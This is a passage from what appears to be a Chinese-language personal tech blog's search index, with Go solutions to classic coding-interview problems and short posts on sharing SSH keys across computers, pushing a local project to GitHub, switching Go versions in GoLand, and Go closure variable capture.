class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param str string字符串 </span></span><br><span class="line"><span class="comment"> * @return string字符串</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReverseSentence</span><span class="params">( str <span class="keyword">string</span> )</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> str == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    stringBuilder := bytes.Buffer&#123;&#125;</span><br><span class="line">    array := strings.Split(str, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="built_in">len</span>(array)<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">        stringBuilder.WriteString(array[i])</span><br><span class="line">        <span class="keyword">if</span> i != <span class="number">0</span> &#123;</span><br><span class="line">            stringBuilder.WriteString(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> stringBuilder.String()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="滑动窗口的最大值"><a href="#滑动窗口的最大值" class="headerlink" title="滑动窗口的最大值"></a><strong>滑动窗口的最大值</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param num int整型一维数组 </span></span><br><span class="line"><span class="comment"> * @param size int整型 </span></span><br><span class="line"><span class="comment"> * @return int整型一维数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">maxInWindows</span><span class="params">( num []<span class="keyword">int</span> ,  size <span class="keyword">int</span> )</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    res := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">0</span>, <span class="built_in">len</span>(num)-size+<span class="number">1</span>)</span><br><span class="line">    deque := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>; i&lt;<span class="built_in">len</span>(num); i++ &#123;</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">len</span>(deque) &gt; <span class="number">0</span> &amp;&amp; num[i] &gt; deque[<span class="built_in">len</span>(deque)<span class="number">-1</span>] &#123;</span><br><span class="line">            deque = deque[:<span class="built_in">len</span>(deque)<span class="number">-1</span>]</span><br><span class="line">        &#125;</span><br><span class="line">        deque = <span class="built_in">append</span>(deque, num[i])</span><br><span class="line">        <span class="comment">//当前最早元素和队列中最大元素一致，就要移出队列中最大元素</span></span><br><span class="line">        <span class="keyword">if</span> i &gt;= size &#123;</span><br><span class="line">            <span class="keyword">if</span> num[i-size] == deque[<span class="number">0</span>] &#123;</span><br><span class="line">                deque = deque[<span class="number">1</span>:]</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">if</span> i &gt;= size - <span class="number">1</span> &#123;</span><br><span class="line">            res = <span class="built_in">append</span>(res, deque[<span class="number">0</span>])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="搜索算法"><a href="#搜索算法" class="headerlink" title="搜索算法"></a>搜索算法</h2><h3 id="数字在升序数组中出现的次数"><a href="#数字在升序数组中出现的次数" class="headerlink" title="数字在升序数组中出现的次数"></a><strong>数字在升序数组中出现的次数</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param data int整型一维数组 </span></span><br><span class="line"><span class="comment"> * @param k int整型 </span></span><br><span class="line"><span class="comment"> * @return int整型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetNumberOfK</span><span class="params">( data []<span class="keyword">int</span> ,  k <span class="keyword">int</span> )</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line"></span><br><span class="line">    r := you(data,k)</span><br><span class="line">    l := zuo(data,k)</span><br><span class="line">    <span class="keyword">if</span> l==<span class="number">-1</span>||r==<span class="number">-1</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r-l+<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">you</span><span class="params">(data []<span class="keyword">int</span> ,  k <span class="keyword">int</span> )</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    l,r := <span class="number">0</span>,<span class="built_in">len</span>(data)<span class="number">-1</span></span><br><span class="line">    <span class="keyword">var</span> mid <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">for</span> l&lt;=r&#123;</span><br><span class="line">        mid = (l+r)/<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> data[mid]&gt;k&#123;</span><br><span class="line">            r = mid <span class="number">-1</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> r&gt;=<span class="number">0</span>&amp;&amp;r&lt;<span class="built_in">len</span>(data) &amp;&amp; data[r]==k&#123;</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">zuo</span><span class="params">(data []<span class="keyword">int</span> ,  k <span class="keyword">int</span> )</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    l,r := <span class="number">0</span>,<span class="built_in">len</span>(data)<span class="number">-1</span></span><br><span class="line">    <span class="keyword">var</span> mid <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">for</span> l&lt;=r&#123;</span><br><span class="line">        mid = (l+r)/<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> data[mid]&lt;k&#123;</span><br><span class="line">            l = mid+<span class="number">1</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            r = mid<span class="number">-1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> l&gt;=<span class="number">0</span>&amp;&amp;l&lt;<span class="built_in">len</span>(data) &amp;&amp; data[l]==k&#123;</span><br><span class="line">        <span class="keyword">return</span> l</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二维数组中的查找"><a href="#二维数组中的查找" class="headerlink" title="二维数组中的查找"></a><strong>二维数组中的查找</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param target int整型 </span></span><br><span class="line"><span class="comment"> * @param array int整型二维数组 </span></span><br><span class="line"><span class="comment"> * @return bool布尔型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Find</span><span class="params">( target <span class="keyword">int</span> ,  array [][]<span class="keyword">int</span> )</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    n, m := <span class="number">0</span>, <span class="built_in">len</span>(array[<span class="number">0</span>]) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> n &lt; <span class="built_in">len</span>(array) &amp;&amp; m &gt;= <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> array[n][m] != target &#123;</span><br><span class="line">            <span class="keyword">if</span> array[n][m] &gt; target &#123;</span><br><span class="line">                m --</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                n ++</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="旋转数组的最小数字"><a href="#旋转数组的最小数字" class="headerlink" title="旋转数组的最小数字"></a><strong>旋转数组的最小数字</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param rotateArray int整型一维数组</span></span><br><span class="line"><span class="comment"> * @return int整型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 19:08</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">minNumberInRotateArray</span><span class="params">(rotateArray []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">left := <span class="number">0</span></span><br><span class="line">right := <span class="built_in">len</span>(rotateArray) - <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> left &lt; right &#123;</span><br><span class="line">mid := left + (right-left)&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> rotateArray[mid] &gt; rotateArray[right] &#123;</span><br><span class="line">left = mid + <span class="number">1</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> rotateArray[mid] &lt;= rotateArray[right] &#123;</span><br><span class="line">right = right - <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> rotateArray[left]</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="字符串的排列"><a href="#字符串的排列" class="headerlink" title="字符串的排列"></a><strong>字符串的排列</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;sort&quot;</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param str string字符串 </span></span><br><span class="line"><span class="comment"> * @return string字符串一维数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Permutation</span><span class="params">( str <span class="keyword">string</span> )</span>  []<span class="title">string</span></span>&#123;</span><br><span class="line"><span class="comment">// 1.对str进行排序</span></span><br><span class="line">sbyte := []<span class="keyword">byte</span>(str)</span><br><span class="line"><span class="keyword">var</span> less <span class="function"><span class="keyword">func</span><span class="params">(i,j <span class="keyword">int</span>)</span><span class="title">bool</span> = <span class="title">func</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> sbyte[i]&lt;=sbyte[j]</span><br><span class="line">&#125;</span><br><span class="line">sort.Slice(sbyte,less)</span><br><span class="line">str = <span class="keyword">string</span>(sbyte)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.回溯法</span></span><br><span class="line">list := <span class="built_in">make</span>([]<span class="keyword">byte</span>,<span class="number">0</span>)</span><br><span class="line">ans := <span class="built_in">make</span>([]<span class="keyword">string</span>,<span class="number">0</span>)</span><br><span class="line">visited := <span class="built_in">make</span>([]<span class="keyword">bool</span>,<span class="built_in">len</span>(str))</span><br><span class="line"><span class="keyword">var</span> backtrace <span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line">backtrace = <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(str)==<span class="built_in">len</span>(list)&#123;</span><br><span class="line">tmp := <span class="built_in">make</span>([]<span class="keyword">byte</span>,<span class="built_in">len</span>(list))</span><br><span class="line"><span class="built_in">copy</span>(tmp,list)</span><br><span class="line">ans = <span class="built_in">append</span>(ans,<span class="keyword">string</span>(tmp))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>;i &lt; <span class="built_in">len</span>(str);i++ &#123;</span><br><span class="line"><span class="keyword">if</span> visited[i] &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> i&gt;<span class="number">0</span> &amp;&amp; str[i]==str[i<span class="number">-1</span>] &amp;&amp; !visited[i<span class="number">-1</span>] &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">visited[i] = <span class="literal">true</span></span><br><span class="line">list = <span class="built_in">append</span>(list,str[i])</span><br><span class="line">backtrace()</span><br><span class="line">list = list[<span class="number">0</span>:<span class="built_in">len</span>(list)<span class="number">-1</span>]</span><br><span class="line">visited[i] = <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    backtrace()</span><br><span class="line"><span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数字序列中某一位的数字"><a href="#数字序列中某一位的数字" class="headerlink" title="数字序列中某一位的数字"></a><strong>数字序列中某一位的数字</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;strconv&quot;</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param n int整型 </span></span><br><span class="line"><span class="comment"> * @return int整型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findNthDigit</span><span class="params">( n <span class="keyword">int</span> )</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> dig = <span class="number">1</span></span><br><span class="line">    <span class="keyword">var</span> left, right = <span class="number">0</span>, <span class="number">10</span></span><br><span class="line">    <span class="keyword">for</span> n &gt; (right - left) * dig &#123;</span><br><span class="line">        n -=  (right - left) * dig</span><br><span class="line">        dig++</span><br><span class="line">        left = right </span><br><span class="line">        right = right * <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> num = n / dig + left</span><br><span class="line">    <span class="keyword">var</span> index = n % dig</span><br><span class="line">    str := strconv.Itoa(num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">int</span>([]<span class="keyword">byte</span>(str)[index] - <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> 技术栈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多台电脑公用ssh远程仓库key</title>
      <link href="/2022/06/07/%E5%A4%9A%E5%8F%B0%E7%94%B5%E8%84%91%E5%85%AC%E7%94%A8ssh%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93key/"/>
      <url>/2022/06/07/%E5%A4%9A%E5%8F%B0%E7%94%B5%E8%84%91%E5%85%AC%E7%94%A8ssh%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93key/</url>
      
        <content type="html"><![CDATA[<p>首先我们得生成一个<a href="https://so.csdn.net/so/search?q=ssh&spm=1001.2101.3001.7020">ssh</a>密钥放到git仓库去具体步骤参考链接：<a href="https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/connecting-to-github-with-ssh">https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/connecting-to-github-with-ssh</a>。<br>接下来我们可能会有这样一个需求：我想在两台电脑上使用同一个ssh<a href="https://so.csdn.net/so/search?q=%E5%AF%86%E9%92%A5&spm=1001.2101.3001.7020">密钥</a>。<br>假设一台电脑已经可以通过ssh方式获取代码。接下来我们要完成如下步骤：<br>1.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name xxx</span><br><span class="line">git config --global user.email xxx</span><br></pre></td></tr></table></figure><p>这个连个信息需要和之前设置好的电脑信息一致。我们可以通过git config -l这个命令去查看之前那台电脑的设置。<br>2.在你需要设置的电脑terminal下执行ssh-keygen命令；<strong>注意这个步骤要在家目录下的.ssh文件夹中执行</strong>。<br>3.将设置好的电脑～/.ssh路径下面的id_rsa，id_rsa.pub覆盖你需要设置的电脑对应的路径下。</p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goland切换go版本</title>
      <link href="/2022/06/05/goland%E5%88%87%E6%8D%A2go%E7%89%88%E6%9C%AC/"/>
      <url>/2022/06/05/goland%E5%88%87%E6%8D%A2go%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>只需要切换goland设置里的goroot，之后apply，不起作用的话重新打开一下项目就行了</p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将本地项目push到github</title>
      <link href="/2022/06/05/%E5%B0%86%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AEpush%E5%88%B0github/"/>
      <url>/2022/06/05/%E5%B0%86%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AEpush%E5%88%B0github/</url>
      
        <content type="html"><![CDATA[<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>再当前项目下<br><code>git init</code></p><h2 id="添加文件"><a href="#添加文件" class="headerlink" title="添加文件"></a>添加文件</h2><p><code>git add .</code><br><code>git commit -m &quot; &quot;</code></p><h2 id="在github上新建一个仓库并与本地关联"><a href="#在github上新建一个仓库并与本地关联" class="headerlink" title="在github上新建一个仓库并与本地关联"></a>在github上新建一个仓库并与本地关联</h2><p>根据使用的协议，远程URL可以以HTTPS或SSH开头。如果未指定协议，则默认为SSH。该URL可以在Git托管服务的存储库页面上找到。<br><code>git remote add origin https://github.com/snowgo/snowgo-gin.git</code><br>或如下<br><code>git remote set-url origin git@gitserver.com:user/repo_name.git</code><br>运行git remote列出现有的遥控器并查看其名称和URL：<br><code>git remote -v</code></p><h2 id="push到远程仓库"><a href="#push到远程仓库" class="headerlink" title="push到远程仓库"></a>push到远程仓库</h2><p>因为github上还是空的，所以要先加-u，之后就不用加了<br><code>git push -u origin master</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master </span><br><span class="line">相当于</span><br><span class="line">git branch --set-upstream-to=origin/master master<span class="comment">//将远程仓库origin的master分支与本地仓库master分支关联</span></span><br><span class="line">加</span><br><span class="line">git push origin master</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="解决本地上传远程的冲突两种方式"><a href="#解决本地上传远程的冲突两种方式" class="headerlink" title="解决本地上传远程的冲突两种方式"></a>解决本地上传远程的冲突两种方式</h3><p>强制覆盖</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -f origin master</span><br></pre></td></tr></table></figure><p>先变基再上传</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull --rebase origin master</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go闭包中值的传递</title>
      <link href="/2022/06/03/go%E9%97%AD%E5%8C%85%E4%B8%AD%E5%80%BC%E7%9A%84%E4%BC%A0%E9%80%92/"/>
      <url>/2022/06/03/go%E9%97%AD%E5%8C%85%E4%B8%AD%E5%80%BC%E7%9A%84%E4%BC%A0%E9%80%92/</url>
      
        <content type="html"><![CDATA[<p>go闭包中对外部变量是以引用的形式传递进去，如下代码所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> funcSlice []<span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">funcSlice = <span class="built_in">append</span>(funcSlice, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="built_in">println</span>(i)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">3</span>; j++ &#123;</span><br><span class="line">funcSlice[j]() <span class="comment">// output：3, 3, 3</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果不想让变量以引用传递进去，可以在外面套一层闭包并加()，以值传递的形式传进去，如下代码所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> funcSlice []<span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line"><span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">funcSlice = <span class="built_in">append</span>(funcSlice, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="built_in">println</span>(i)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;(i)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">3</span>; j++ &#123;</span><br><span class="line">funcSlice[j]() <span class="comment">// output：0, 1, 2</span></span><br><span class="line">&#125;</span><br><span 